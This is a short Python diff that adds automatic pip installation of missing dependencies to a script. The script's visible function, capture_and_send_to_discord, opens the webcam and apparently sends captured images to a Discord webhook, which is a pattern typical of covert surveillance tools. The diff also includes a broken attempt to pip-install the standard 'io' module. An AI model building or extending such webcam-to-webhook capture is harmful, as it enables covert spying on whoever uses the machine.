@@ -1,7 +1,27 @@
-import cv2
-import requests
-from io import BytesIO
-from PIL import Image
+import subprocess
+import sys
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+try:
+    import cv2
+except ImportError:
+    install('opencv-python')
+    import cv2
+try:
+    import requests
+except ImportError:
+    install('requests')
+    import requests
+try:
+    from io import BytesIO
+except ImportError:
+    install('io')
+    from io import BytesIO
+try:
+    from PIL import Image
+except ImportError:
+    install('Pillow')
+    from PIL import Image
 def capture_and_send_to_discord(webhook_url):
     cap = cv2.VideoCapture(0)
     if not cap.isOpened():
